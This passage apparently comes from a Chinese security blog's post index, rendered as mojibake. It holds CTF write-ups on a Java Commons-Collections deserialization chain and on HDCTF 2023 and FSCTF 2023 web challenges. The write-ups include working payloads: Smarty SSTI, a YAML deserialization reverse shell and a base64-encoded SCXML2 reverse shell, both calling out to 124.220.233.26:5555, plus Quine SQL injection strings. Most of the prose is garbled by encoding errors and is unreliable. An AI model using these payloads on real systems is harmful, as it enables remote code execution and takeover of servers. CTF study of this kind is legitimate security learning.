æ¥ç€æˆ‘ä»¬è¿”å›åˆ°åˆšåˆšçš„å¯¹decorateMapçš„é”®å€¼å¯¹çš„éå†ï¼ŒdecorateMapå±äºTransformedMapç±»ä¸­çš„å±æ€§ï¼Œä½†ç¡®å®Mapå¯¹è±¡å®ä¾‹ï¼Œè¿™é‡Œè¯´map.entrySetå®é™…ä¸Šè°ƒç”¨çš„æ˜¯çˆ¶ç±»çš„entrySetæ–¹æ³•ï¼Œè€Œçˆ¶ç±»åˆç»§æ‰¿äº†Mapå¯¹è±¡çš„æ¥å£ï¼Œå› æ­¤æˆ‘ä»¬æ‰èƒ½å¯¹Mapå¯¹è±¡éå†å¾—åˆ°setValueæ–¹æ³•ï¼Œè¿™é‡Œæˆ‘ä»¬åœ¨éå†åˆ°setValueæ–¹æ³•ä¹‹åï¼Œå¦‚ä¸‹å›¾ï¼Œä»–æœ¬åº”è¯¥è°ƒç”¨è¯¥ç±»ä¸‹çš„setValueæ–¹æ³•ï¼Œä½†æ˜¯è¯¥ç±»çš„å­ç±»å´é‡å†™äº†setValueæ–¹æ³•ï¼Œè¿™æ„å‘³ç€æœ€ç»ˆè°ƒç”¨çš„æ˜¯å­ç±»çš„setValueæ–¹æ³• å¦‚ä¸Šå›¾ï¼Œè¯¥å­ç±»çš„åˆå»è°ƒç”¨äº†checkSetValueæ–¹æ³•ï¼Œè¿™é‡Œæ³¨æ„æ˜¯å»ç”¨parentè°ƒç”¨checkSetValueæ–¹æ³•ï¼Œè€Œparentæ˜¯AbstractInputCheckedMapDecoratorå¯¹è±¡å®ä¾‹ï¼Œè€Œç”±äºAbstractInputCheckedMapDecoratorè™½ç„¶å®ç°äº†checkSetValueæ–¹æ³•ï¼Œä½†å­ç±»é‡å†™äº†è¯¥æ–¹æ³•ï¼Œäºæ˜¯å°±ä¼šå»å­ç±»ä¸­è°ƒç”¨checkSetValueæ–¹æ³•ã€‚æˆ‘ä»¬è¿›å…¥åˆ°å­ç±»å¯¹åº”çš„æ–¹æ³• å‘ç°æ˜¯ç”¨valueTransformerè°ƒç”¨transformæ–¹æ³•ï¼Œè€ŒvalueTransformerå·²ç»è¢«æˆ‘ä»¬èµ‹å€¼ä¸ºchainedTransformerç±»å¯¹è±¡å®ä¾‹ï¼Œè€Œè¯¥å®ä¾‹çš„å€¼ä¸ºå¦‚ä¸‹ï¼š Transformer[] transformers = { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\", new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}), }; ç»è¿‡chainedTransformerå®ä¾‹ä¸­çš„transformæ–¹æ³•ï¼Œä¼šå¯¹ä¸Šè¿°æ•°ç»„å…ƒç´ åˆ†åˆ«è°ƒç”¨transformæ–¹æ³•ï¼Œç›®çš„å°±æ˜¯æ„é€ å‡ºRuntimeç±»å®ä¾‹ï¼Œå¹¶æœ€ç»ˆè°ƒç”¨å®ƒçš„execæ–¹æ³•ã€‚é‚£è¿™é‡Œè¿˜éœ€è¦æ³¨æ„ConstantTransformerç±»çš„ä½œç”¨ï¼šå› ä¸ºè¿™é‡Œæ˜¯è°ƒç”¨ConstantTransformerç±»çš„transformæ–¹æ³•ï¼Œè¯¥å®ƒçš„transformæ–¹æ³•æ˜¯ä¸è®ºä¼ å…¥ä»€ä¹ˆå‚æ•°ï¼Œå§‹ç»ˆè¿”å›ä¸€ä¸ªå¸¸é‡ï¼Œè€Œè¯¥å¸¸é‡å°±æ˜¯æ„é€ å‡½æ•°æ—¶å€™ä¼ å…¥çš„å‚æ•°ï¼ˆåœ¨è¿™é‡Œå°±æ˜¯Runtime.classç±»å¯¹è±¡ï¼‰ æˆ‘ä»¬å¯ä»¥çœ‹çœ‹ä¸ºä½•è¦æœ‰è¿™ä¸ªç±»çš„å­˜åœ¨ï¼Œå¦‚ä¸‹å›¾ï¼Œåœ¨ååºåˆ—åŒ–å…¥å£ç‚¹ï¼Œè¿™é‡Œçš„setValueå‚æ•°æ˜æ˜¾ä¸å¯æ§ï¼Œæˆ‘ä»¬æƒ³è¦çš„æ˜¯ä¼ å…¥Runtimeç±»å¯¹è±¡ï¼Œè¿›è€Œå¯ä»¥è°ƒç”¨execï¼Œä½†å¦‚æœæˆ‘ä»¬ä½¿ç”¨ä»£ç ï¼šnew ConstantTransformer(Runtime.class)ï¼Œè·Ÿè¸ªè¿™æ¡é“¾å­ä½ ä¼šå‘ç°ï¼Œæœ€ç»ˆçš„è°ƒç”¨æ˜¯è¿™æ ·çš„ å¦‚ä¸Šä¸¤å¹…å›¾ï¼Œæœ€ç»ˆåœ¨å…ˆè°ƒç”¨ConstantTransformerçš„transformæ–¹æ³•æ—¶ï¼Œä¹Ÿå°±æ˜¯è¿”å›çš„ç¬¬ä¸€ä¸ªObjectå¯¹è±¡å°±æ˜¯å¸¸é‡iConstantï¼Œè¿™é‡Œå·²ç»è¢«èµ‹å€¼ä¸ºäº†Runtime.classï¼Œå®Œç¾è§£å†³ä¸Šè¿°å…¥å£ç‚¹å‚æ•°ä¸å¯æ§çš„é—®é¢˜ã€‚ è‡³æ­¤å›é¡¾å®Œä¸Šè¿°é“¾å­ æ€»ç»“ è¿™é‡Œæ€»ç»“ä¸€ä¸‹é“¾å­ ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() Map().setValue() TransformedMap.decorateMap ChainedTransformer.transformer() ConstantTransformer.transformer() InvokerTransformer.transformer() Method.getMethod getMethod.getRuntime InvokerTransformer.transformer() Method.invoke Runtime.getRuntime InvokerTransformer.transformer() Method.exec Runtime.getRuntime.exec åˆ°è¿™é‡Œç®—æ˜¯å®ŒæˆJavaååºåˆ—åŒ–çš„ç¬¬ä¸€ä¸ªé“¾å­äº†ï¼Œæ€»çš„æ¥è¯´ï¼Œåˆ†æè¿‡ç¨‹å¹¶ä¸é¡ºåˆ©ï¼Œä¸”åŸºæœ¬æ˜¯é ç€æ–‡ç« è¿‡æ¥çš„ï¼Œæ²¡æœ‰è‡ªå·±çš„è§è§£ï¼Œå¹¶ä¸”ä¹Ÿæ„Ÿå—åˆ°äº†è‡ªèº«JavaåŸºç¡€æœ‰äº¿ç‚¹ç‚¹è–„å¼±ï¼ˆå°±çŸ¥é“ä¸ªåŸºç¡€è¯­æ³•ï¼‰ï¼Œæ ¹æ®å¸ˆå‚…çš„å»ºè®®ï¼Œä¸‹å»çœ‹çœ‹Java seç­‰ç›¸å…³Javaå¼€å‘çš„æ•™ç¨‹ï¼Œå¯¹æ•´ä¸ªä»£ç å¸ƒå±€å’Œå†™æ³•æœ‰ä¸ªç†è§£ï¼Œä¸ç„¶åˆ†æçš„æ—¶å€™ï¼Œå®Œå…¨å¾—é æ–‡ç« å’ŒGPTï¼Œè¿›æ­¥è‚¯å®šå¾®å¼±ã€‚ åªèƒ½è¯´ä»»é‡é“è¿œï¼Œæ¥ä¸‹æ¥ä¾æ—§æ˜¯åˆ†æä¸€äº›å¸¸è§çš„Javaååºåˆ—åŒ–é“¾å­ï¼Œå¯¹Javaååºåˆ—åŒ–æœ‰ä¸€ä¸ªè¾ƒæ·±çš„ç†è§£ã€‚ å‚è€ƒæ–‡ç«  Javaååºåˆ—åŒ–CommonsCollectionsç¯‡(ä¸€) CC1é“¾æ‰‹å†™EXP JAVAå®‰å…¨åˆæ¢(ä¸‰):CC1é“¾å…¨åˆ†æ Java ååºåˆ—åŒ–ä¹‹CC1é“¾","tags":["Javaååºåˆ—åŒ–"],"categories":["Javaååºåˆ—åŒ–"]},{"title":"HDCTF","path":"/2024/03/18/hdctf/","content":"[HDCTF 2023]Welcome To HDCTF 2023 å®¡jsçœ‹åˆ°å¦‚ä¸Šä»£ç ï¼Œä¸‹æ„è¯†ç›´æ¥console.logè¾“å…¥å³å¯ [HDCTF 2023]SearchMaster è®¿é—®composer.jsonæ³„éœ²smarty ç›´æ¥ä½¿ç”¨ç°æˆçš„payloadå³å¯ï¼Œssti smartyå¯å‚è€ƒï¼šSmartyæ¨¡æ¿å¼•æ“æ¼æ´è¯¦è§£ data={system(â€˜cat /flag_13_searchmasterâ€™)} [HDCTF 2023]YamiYami è¿™é‡Œçš„ssrfåœ°æ–¹å¯ä»¥è¿›è¡Œæ–‡ä»¶è¯»å–ï¼Œä½†æ˜¯å½“è¯»å–app\\app.pyçš„æ—¶å€™è¢«è¿‡æ»¤äº†ï¼Œçœ‹äº†wpå‘ç°äºŒæ¬¡urlç¼–ç å³å¯ #encoding:utf-8 import os import re, random, uuid from flask import * from werkzeug.utils import * import yaml from urllib.request import urlopen app = Flask(__name__) random.seed(uuid.getnode()) app.config['SECRET_KEY'] = str(random.random()*233) app.debug = False BLACK_LIST=[\"yaml\",\"YAML\",\"YML\",\"yml\",\"yamiyami\"] app.config['UPLOAD_FOLDER']=\"/app/uploads\" @app.route('/') def index(): session['passport'] = 'YamiYami' return ''' Welcome to HDCTF2023 &lt;a href=\"/read?url=https://baidu.com\"&gt;Read somethings&lt;/a&gt; &lt;br&gt; Here is the challenge &lt;a href=\"/upload\"&gt;Upload file&lt;/a&gt; &lt;br&gt; Enjoy it &lt;a href=\"/pwd\"&gt;pwd&lt;/a&gt; ''' @app.route('/pwd') def pwd(): return str(pwdpath) @app.route('/read') def read(): try: url = request.args.get('url') m = re.findall('app.*', url, re.IGNORECASE) n = re.findall('flag', url, re.IGNORECASE) if m: return \"re.findall('app.*', url, re.IGNORECASE)\" if n: return \"re.findall('flag', url, re.IGNORECASE)\" res = urlopen(url) return res.read() except Exception as ex: print(str(ex)) return 'no response' def allowed_file(filename): for blackstr in BLACK_LIST: if blackstr in filename: return False return True @app.route('/upload', methods=['GET', 'POST']) def upload_file(): if request.method == 'POST': if 'file' not in request.files: flash('No file part') return redirect(request.url) file = request.files['file'] if file.filename == '': return \"Empty file\" if file and allowed_file(file.filename): filename = secure_filename(file.filename) if not os.path.exists('./uploads/'): os.makedirs('./uploads/') file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename)) return \"upload successfully!\" return render_template(\"index.html\") @app.route('/boogipop') def load(): if session.get(\"passport\")==\"Welcome To HDCTF2023\": LoadedFile=request.args.get(\"file\") if not os.path.exists(LoadedFile): return \"file not exists\" with open(LoadedFile) as f: yaml.full_load(f) f.close() return \"van you see\" else: return \"No Auth bro\" if __name__=='__main__': pwdpath = os.popen(\"pwd\").read() app.run( debug=False, host=\"0.0.0.0\" ) print(app.config['SECRET_KEY']) ä¸Šè¿°ä»£ç ï¼Œä¸»è¦æ˜¯çœ‹/boogipopè·¯ç”±çš„å¤„ç†ï¼Œå½“æˆ‘ä»¬çš„sessionæ­£ç¡®çš„è¯ï¼Œå°±å°†æˆ‘ä»¬å¯¹fileå‚æ•°æŒ‡å®šçš„æ–‡ä»¶åŠ è½½å‡ºæ¥ï¼Œè€Œè¿™é‡Œä½¿ç”¨äº†full_loadå‡½æ•°ï¼Œå¯ä»¥é€ æˆååºåˆ—åŒ–ï¼Œæˆ‘ä»¬åªéœ€è¦ç»•è¿‡é»‘åå•å³å¯ã€‚ è¿™é‡Œçš„ä¸Šä¼ é»‘åå•ç¦æ‰äº†Yamlç­‰ï¼Œè¿™å…¶å®æ˜¯ä¸€ä¸ªéš¾ç‚¹ã€‚ä½†æ˜¯ä¸Šä¼ txtæ–‡ä»¶ä¹Ÿèƒ½è¢«è§£ææˆYamlã€‚åŸå› åœ¨äºï¼Œåªè¦æ–‡ä»¶çš„å†…å®¹ç¡®å®ç¬¦åˆ YAML æ•°æ®æ ¼å¼ï¼Œä½ ä»ç„¶å¯ä»¥å°è¯•å°†å…¶è§£æä¸º YAML æ•°æ®ã€‚ é¦–å…ˆå°±æ˜¯è·å–session_key //è¯»å–file:///sys/class/net/eth0/address 02:42:ac:02:1b:ed-ã€‹0242ac021bed-ã€‹2485376916461 å¾—åˆ°åå…­è¿›åˆ¶å³å¯ï¼Œæ¥ä¸‹æ¥ç”Ÿæˆkey import random random.seed(0x0242ac021bed) print(str(random.random()*233)) #å¾—åˆ°158.50325024906226 æ¥ä¸‹æ¥ä¼ªé€ session eyJwYXNzcG9ydCI6IldlbGNvbWUgVG8gSERDVEYyMDIzIn0.Zf7jvw.hude4V5Px2U7rOmeFZ2HKQMO9Tc æ¥ä¸‹æ¥æ„é€ yamlæ–‡ä»¶è¿›è¡Œååºåˆ—åŒ–ï¼Œè¿™é‡Œé‡‡ç”¨åå¼¹shell - !!python/object/new:str args: [] state: !!python/tuple - \"__import__('os').system('bash -c \\\"bash -i &gt;&amp; /dev/tcp/124.220.233.26/5555 0&gt;&amp;1\\\"')\" - !!python/object/new:staticmethod args: [0] state: update: !!python/name:exec ä¹‹åç›´æ¥ä¸Šä¼ æ–‡ä»¶ï¼ŒéšåbpæŠ“åŒ…ä¿®æ”¹sessionï¼Œç„¶åè¯»å–æŒ‡å®šæ–‡ä»¶ï¼Œå³å¯æ‹¿åˆ°shell å‚è€ƒæ–‡ç«  [HDCTF 2023]YamiYami [HDCTF 2023]LoginMaster è¿™é“é¢˜é‡åˆ°äº†æ–°çŸ¥è¯†ç‚¹ï¼šquineæ³¨å…¥ï¼ˆè¾“å…¥è¾“å‡ºä¸€è‡´ï¼Œç»•è¿‡é™åˆ¶ç™»å½•ï¼‰ Quineæ³¨å…¥ é¦–å…ˆäº†è§£ä¸€æ³¢å…³äºQuineæ³¨å…¥çš„çŸ¥è¯† replace()å‡½æ•°ï¼š replace(a,b,c) æŠŠaä¸­çš„bæ¢æˆc //å¦‚ replace('abb','b','c') -&gt; acc mysql&gt; select ascii('.'); +------------+ | ascii('.') | +------------+ | 46 | +------------+ 1 row in set (0.02 sec) mysql&gt; select replace(\".\",chr(46),\".\"); 1305 - FUNCTION security.chr does not exist mysql&gt; select replace(\".\",char(46),\".\"); +---------------------------+ | replace(\".\",char(46),\".\") | +---------------------------+ | . | +---------------------------+ 1 row in set (0.02 sec) è¿™é‡Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬å·²ç»çœ‹åˆ°äº†è¾“å…¥ä¸è¾“å‡ºä¸€æ ·çš„åŸå‹äº†ï¼Œç»§ç»­å¾€ä¸‹æ„é€  mysql&gt; select replace('replace(\".\",char(46),\".\")',char(46),'replace(\".\",char(46),\".\")'); +---------------------------------------------------------------------------+ | replace('replace(\".\",char(46),\".\")',char(46),'replace(\".\",char(46),\".\")') | +---------------------------------------------------------------------------+ | replace(\"replace(\".\",char(46),\".\")\",char(46),\"replace(\".\",char(46),\".\")\") | +---------------------------------------------------------------------------+ 1 row in set (0.02 sec) å¯ä»¥çœ‹åˆ°è¿™é‡Œå¥—å¨ƒæˆåŠŸï¼Œè¿™é‡Œçš„æ„æ€å°±æ˜¯æŠŠå­—ç¬¦ä¸²replace(\".\",char(46),\".\")ä¸­çš„ç¬¦å· . æ›¿æ¢ä¸ºå­—ç¬¦ä¸²replace(\".\",char(46),\".\")ï¼Œå› æ­¤æœ€ç»ˆä¼šå‘ç°æ›¿æ¢ä¹‹åè·ŸåŸæ¥çš„è¾“å‡ºåŸºæœ¬ä¸€è‡´ã€‚ä¸é€šç”µå°±åœ¨äºå­—ç¬¦ä¸²replace(\".\",char(46),\".\")ä¸¤è¾¹ï¼šåŸå‹æ˜¯è¢«å•å¼•å·åŒ…è£¹ï¼Œè€Œè¾“å‡ºç»“æœæ˜¯åŒå¼•å·ï¼Œè¿™æ„å‘³ç€è¾“å…¥è¾“å‡ºè¿˜æ²¡æœ‰ä¸€è‡´ï¼Œæˆ‘ä»¬è¿˜éœ€è¦æƒ³åŠæ³•å°†åŒå¼•å·æ›¿æ¢ä¸ºå•å¼•å· æˆ‘ä»¬çœ‹ä¸€ä¸‹å•åŒå¼•å·çš„ASCIIç  mysql&gt; select ascii('\"'); +------------+ | ascii('\"') | +------------+ | 34 | +------------+ 1 row in set (0.03 sec) mysql&gt; select ascii(\"'\"); +------------+ | ascii(\"'\") | +------------+ | 39 | +------------+ 1 row in set (0.03 sec) é‚£å¦‚æœæˆ‘ä»¬åœ¨åµŒå…¥ä¸€å¥—replaceä¼šå¦‚ä½•å‘¢ mysql&gt; select replace(replace('\".\"',char(34),char(39)),char(46),\".\"); +--------------------------------------------------------+ | replace(replace('\".\"',char(34),char(39)),char(46),\".\") | +--------------------------------------------------------+ | '.' | +--------------------------------------------------------+ 1 row in set (0.03 sec) å¯ä»¥çœ‹åˆ°è¿™æ ·çš„è¯ï¼Œå­—ç¬¦ä¸²ä¸¤æ®µå°±å˜æˆäº†å•å¼•å·åŒ…è£¹ã€‚æŒ‰ç…§è¿™ç§æ€è·¯ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·æ„é€  select replace('replace(\".\",char(46),\".\")',char(34),char(39)); //replace('.',char(46),'.') select replace(replace('replace(replace(\".\",char(34),char(39)),char(46),\".\")',char(34),char(39)),char(46),'replace(replace(\".\",char(34),char(39)),char(46),\".\")') mysql&gt; select replace(replace('replace(replace(\".\",char(34),char(39)),char(46),\".\")',char(34),char(39)),char(46),'replace(replace(\".\",char(34),char(39)),char(46),\".\")'); +------------------------------------------------------------------------------------------------------------------------------------------------------------+ | replace(replace('replace(replace(\".\",char(34),char(39)),char(46),\".\")',char(34),char(39)),char(46),'replace(replace(\".\",char(34),char(39)),char(46),\".\")') | +------------------------------------------------------------------------------------------------------------------------------------------------------------+ | replace(replace('replace(replace(\".\",char(34),char(39)),char(46),\".\")',char(34),char(39)),char(46),'replace(replace(\".\",char(34),char(39)),char(46),\".\")') | +------------------------------------------------------------------------------------------------------------------------------------------------------------+ 1 row in set (0.04 sec) å¯ä»¥çœ‹åˆ°å›æ˜¾çš„å­—ç¬¦ä¸²å·²ç»ä¸€è‡´äº†ï¼Œé‚£æ¥ä¸‹æ¥å°±æ˜¯æ ¹æ®é¢˜ç›®çœ‹çœ‹å¦‚ä½•ç”¨äº†ã€‚è¿™é‡Œå¯ä»¥çœ‹ä¸€ç¯‡æ–‡ç« æ€»ç»“çš„å°tips QuineåŸºæœ¬å½¢å¼ï¼š replace(replace('str',char(34),char(39)),char(46),'str') å…ˆå°†stré‡Œçš„åŒå¼•å·æ›¿æ¢æˆå•å¼•å·ï¼Œå†ç”¨stræ›¿æ¢stré‡Œçš„. stråŸºæœ¬å½¢å¼ï¼ˆå¯ä»¥ç†è§£æˆä¸Šé¢çš„\".\"ï¼‰ replace(replace(\".\",char(34),char(39)),char(46),\".\") å®Œæ•´çš„Quineå°±æ˜¯QuineåŸºæœ¬å½¢å¼+stråŸºæœ¬å½¢å¼ æ ¹æ®robots.txtçš„æç¤º function checkSql($s) { if(preg_match(\"/regexp|between|in|flag|=| &gt; |&lt;|and|\\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\\\\$|0x|sleep|\\ /i\",$s)){ alertMes('hacker', 'index.php'); } } if ($row['password'] === $password) { die($FLAG); } else { alertMes(\"wrong password\",'index.php'); è¿™é‡Œç»è¿‡é»‘åå•çš„é™åˆ¶ï¼Œå¹¶ä¸”æ£€éªŒçš„æ˜¯passwordå‚æ•°ï¼Œè€Œç”¨æˆ·åå¿…é¡»æ˜¯adminï¼Œä¹Ÿå°±æ˜¯è¯´æ³¨å…¥ç‚¹åªèƒ½æ˜¯passwordã€‚è€Œåªæœ‰æŸ¥è¯¢å‡ºæ¥çš„passwordä¸æˆ‘ä»¬è¾“å…¥çš„passwordç›¸åŒï¼Œæ‰èƒ½å›æ˜¾flag mysql&gt; select password from users where username='admin' and password='asdasdas' union select 'password'; +----------+ | password | +----------+ | password | +----------+ 1 row in set (0.04 sec) mysql&gt; select password from users where username='admin' and password='admin' union select 'password'; +----------+ | password | +----------+ | admin | | password | +----------+ 2 rows in set (0.04 sec) æˆ‘ä»¬å¯ä»¥çœ‹ä¸Šè¿°ä¸¤ä¸ªSQLè¯­å¥ï¼Œå¯ä»¥çœ‹åˆ°å½“unionè¯­å¥å‰é¢çš„SQLæŸ¥è¯¢é”™è¯¯ï¼Œå°†åªè¿”å›åé¢selectæ‰€æŒ‡å®šçš„å­—ç¬¦ä¸²ï¼Œä¹Ÿå°±æ˜¯password è¿™æ ·çš„è¯æˆ‘ä»¬è”ç³»ä¸Šé¢å­¦ä¹ çš„quineæ³¨å…¥ï¼Œå®Œå…¨å¯ä»¥åˆ©ç”¨replaceä½¿å¾—æ‰§è¡Œå‰åçš„å­—ç¬¦ä¸²å®Œå…¨ç›¸åŒã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥è¿™æ ·æ„é€  //é‚£æˆ‘ä»¬å…ˆæ„é€ çš„åŸå§‹payloadå¦‚ä¸‹ï¼š 1'/**/union/**/select/**/replace(replace(\".\",char(34),char(39)),char(46),\".\")# //å°†ä¸Šè¿°payloadå¸¦å…¥quineçš„åŸºæœ¬å¥å‹ä¸­å³å¯ select password from users where username='admin' and password='1'/**/union/**/select/**/replace(replace('1\"/**/union/**/select/**/replace(replace(\".\",char(34),char(39)),char(46),\".\")#',char(34),char(39)),char(46),'1\"/**/union/**/select/**/replace(replace(\".\",char(34),char(39)),char(46),\".\")#')# å‚è€ƒæ–‡ç«  Quineæ³¨å…¥ CTFHub_2021-ç¬¬äº”ç©ºé—´æ™ºèƒ½å®‰å…¨å¤§èµ›-Web-yet_another_mysql_injectionï¼ˆquineæ³¨å…¥ï¼‰ [HDCTF 2023]Login Master å¤ç° [HDCTF 2023]BabyJxVx è¿™é“é¢˜ä¹Ÿæ˜¯æ ¹æ®æç¤ºçŸ¥é“çš„æ˜¯SCXML2çš„RCEï¼Œå…·ä½“çš„æ¼æ´å¤ç°æ–‡ç« åœ¨ä¸‹é¢åˆ—å‡ºï¼Œè¿™é‡Œæˆ‘ä¹Ÿæ²¡å­¦ï¼Œå°±ç›´æ¥åˆ†æä¸€éä»£ç å¼€å§‹æ‰“äº† é¦–å…ˆé¢˜ç›®ç»™äº†æˆ‘ä»¬jaråŒ… åç¼–è¯‘ä¹‹åï¼Œæˆ‘è®¤ä¸ºæ¯”è¾ƒå¥½è®¤ä¸ºå­˜åœ¨SCXML2æ¼æ´çš„å°±æ˜¯çœ‹ä¸Šé¢æ˜¯å¦å«æœ‰è¿™å‡ ä¸ªjavaåŒ…ï¼Œæ¥ä¸‹æ¥åˆ†æä¸€ä¸‹ä»£ç é€»è¾‘ @RequestMapping({\"/\"}) public String index() { return \"index\"; } @RequestMapping({\"/Flag\"}) @ResponseBody public String Flag(@RequestParam(required = true) String filename) { SCXMLExecutor executor = new SCXMLExecutor(); try { if (check(filename)) { SCXML scxml = SCXMLReader.read(filename); executor.setStateMachine(scxml); executor.go(); return \"Revenge to me!\"; } System.out.println(\"nonono\"); } catch (Exception var4) { System.out.println(var4); } return \"revenge?\"; } å…ˆçœ‹ä¸»ä½“ï¼Œè¿™é‡Œ/è·¯ç”±ä¸‹æ²¡å•¥è¯´çš„ï¼Œ/Flagè·¯ç”±ä¸‹ï¼Œä¼šå¼ºåˆ¶è¦æ±‚æ¥å—ä¸€ä¸ªfilenameçš„å‚æ•°ï¼Œå¦åˆ™æŠ¥é”™ï¼Œæ¥ç€è°ƒç”¨checkå‡½æ•°æ£€æŸ¥filenameçš„æŸäº›å†…å®¹ï¼Œå¦‚æœæ²¡é—®é¢˜ï¼Œåˆ™è°ƒç”¨SCXMLåŒ…çš„ç›¸å…³å‡½æ•°å»è¯»å–filenameæ–‡ä»¶ï¼Œå­˜å‚¨ç»“æœä¸scxmlå˜é‡ã€‚ç„¶åå°†å…ˆå‰è¯»å–çš„ SCXML å®šä¹‰è®¾ç½®ä¸º executor çš„çŠ¶æ€æœºï¼Œæ¥ç€è°ƒç”¨goå¯åŠ¨çŠ¶æ€æœºçš„æ‰§è¡Œã€‚ æ¥ä¸‹æ¥çœ‹checkå‡½æ•° private static Boolean check(String fileName) throws IOException, ParserConfigurationException, SAXException { DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); DocumentBuilder builder = dbf.newDocumentBuilder(); Document doc = builder.parse(fileName); int node1 = doc.getElementsByTagName(\"script\").getLength(); int node2 = doc.getElementsByTagName(\"datamodel\").getLength(); int node3 = doc.getElementsByTagName(\"invoke\").getLength(); int node4 = doc.getElementsByTagName(\"param\").getLength(); int node5 = doc.getElementsByTagName(\"parallel\").getLength(); int node6 = doc.getElementsByTagName(\"history\").getLength(); int node7 = doc.getElementsByTagName(\"transition\").getLength(); int node8 = doc.getElementsByTagName(\"state\").getLength(); int node9 = doc.getElementsByTagName(\"onentry\").getLength(); int node10 = doc.getElementsByTagName(\"if\").getLength(); int node11 = doc.getElementsByTagName(\"elseif\").getLength(); return node1 &lt;= 0 &amp;&amp; node2 &lt;= 0 &amp;&amp; node3 &lt;= 0 &amp;&amp; node4 &lt;= 0 &amp;&amp; node5 &lt;= 0 &amp;&amp; node6 &lt;= 0 &amp;&amp; node7 &lt;= 0 &amp;&amp; node8 &lt;= 0 &amp;&amp; node9 &lt;= 0 &amp;&amp; node10 &lt;= 0 &amp;&amp; node11 &lt;= 0 ? true : false; } å¾ˆç®€å•ï¼Œå°±æ˜¯å°†ä¼ å…¥çš„filenameå‚æ•°ï¼Œé€šè¿‡DocumentBuilderFactoryå®ä¾‹æ¥è§£æXMLæ–‡æ¡£ï¼Œä½¿ç”¨ DocumentBuilder è§£æç»™å®šçš„ fileName æ–‡ä»¶ï¼Œå¹¶å°†ç»“æœå­˜å‚¨åœ¨ doc å˜é‡ä¸­ã€‚ä¹‹åå°±æ˜¯ç»Ÿè®¡é‚£äº›æ ‡ç­¾åœ¨XMLæ–‡æ¡£ä¸­å‡ºç°çš„æ¬¡æ•°ï¼Œåªè¦å‡ºç°è¿‡ï¼Œåˆ™è¿”å›falseã€‚ä¹Ÿå°±æ˜¯é»‘åå•è¿‡æ»¤ï¼Œè¿™é‡Œæ ¹æ®æ–‡ç« æ‰€è¯´ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¾ˆå¤šæ ‡ç­¾æ¥ç»•è¿‡ï¼Œå› ä¸ºè¿™ä¸ªé»‘åå•è¿‡æ»¤ä¸å…¨ è¿™é‡Œæˆ‘ç›´æ¥ä¸Špayloadï¼šshell.xml &lt;?xml version=\"1.0\"?&gt; &lt;scxml xmlns=\"http://www.w3.org/2005/07/scxml\" version=\"1.0\" initial=\"run\"&gt; &lt;final id=\"run\"&gt; &lt;onexit&gt; &lt;assign location=\"flag\" expr=\"''.getClass().forName('java.lang.Runtime').getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjIzMy4yNi81NTU1IDA+JjE=}|{base64,-d}|{bash,-i}')\"/&gt; &lt;/onexit&gt; &lt;/final&gt; &lt;/scxml&gt; ï¼šå®šä¹‰äº†ä¸€ä¸ª SCXML çŠ¶æ€æœºï¼Œå…¶ä¸­ xmlnså±æ€§æŒ‡å®šäº†å‘½åç©ºé—´ï¼Œversionå±æ€§æŒ‡å®šäº†ç‰ˆæœ¬ï¼Œinitial å±æ€§æŒ‡å®šäº†åˆå§‹çŠ¶æ€ä¸º runã€‚ ï¼šå®šä¹‰äº†ä¸€ä¸ªçŠ¶æ€ï¼Œå®ƒæ˜¯æœ€ç»ˆçŠ¶æ€ï¼Œå®ƒçš„ id å±æ€§ä¸º runã€‚ ï¼šå®šä¹‰äº†ä¸€ä¸ªäº‹ä»¶ï¼Œåœ¨é€€å‡ºçŠ¶æ€æ—¶è§¦å‘ &lt;assingâ€¦&gt; ï¼š location å±æ€§æŒ‡å®šäº†è¦èµ‹å€¼çš„å˜é‡åç§°ï¼Œexpr å±æ€§æŒ‡å®šäº†è¦èµ‹ç»™å˜é‡çš„å€¼ã€‚ æ¥ä¸‹æ¥vpsä¸Šæ„é€ è¯¥æ–‡ä»¶å³å¯ æœ‰åŠŸå¤«æµ…æµ…çœ‹ä¸€ä¸‹æ¼æ´åŸç† å‚è€ƒæ–‡ç«  Apache SCXML2 RCEåˆ†æ â€“å‡ºé¢˜äºº Apache SCXML2 RCEæ¼æ´ 2023æ•°å­—ä¸­å›½åˆ›æ–°å¤§èµ› XxMe Writeup","tags":["CTFèµ›äº‹"],"categories":["CTFèµ›äº‹"]},{"title":"FSCTF 2023","path":"/2024/03/17/fsctf-2023/","content":"[FSCTF 2023]æºç ï¼å¯åŠ¨! [FSCTF 2023]webshellæ˜¯å•¥æ [FSCTF 2023]ç»†ç‹—2.0 [FSCTF 2023]EZ_eval å¦‚æœæƒ³ca\\tè¿›è¡Œè¯»å–ï¼Œä½ ä¼šå‘ç°\\tæ˜¯ä¸€ä¸ªåˆ¶è¡¨ç¬¦ï¼Œå°±ä¸æ˜¯æ‰€è°“çš„catå‘½ä»¤äº† [FSCTF 2023]Hello,you $input = isset($_GET['input']) ? $_GET['input'] : ''; // æ‰§è¡Œå‘½ä»¤å¹¶è¿”å›ç»“æœ function executeCommand($command) { $output = ''; exec($command, $output); return $output; } // æ³¨å†Œç”¨æˆ· function registerUser($username) { // ......... $command = \"echo Hello, \" . $username; $result = executeCommand($command); return $result; } // å¤„ç†æ³¨å†Œè¯·æ±‚ if (isset($_POST['submit'])) { $username = $_POST['username']; $result = registerUser($username); } é‰´äºæœ‰echoçš„å­˜åœ¨ï¼Œæˆ‘ä»¬ç›´æ¥åå¼•å·å³å¯ï¼Œè¿™é‡Œè¿‡æ»¤äº†å‡ ä¸ªå…³é”®å­—è€Œå·²ï¼Œnlå³å¯ç»•è¿‡ [FSCTF 2023]ez_php1 &lt;?php highlight_file(__FILE__); error_reporting(0); include \"globals.php\"; $a = $_GET['b']; $b = $_GET['a']; if($a!=$b&amp;&amp;md5($a)==md5($b)) { echo \"!!!\"; $c = 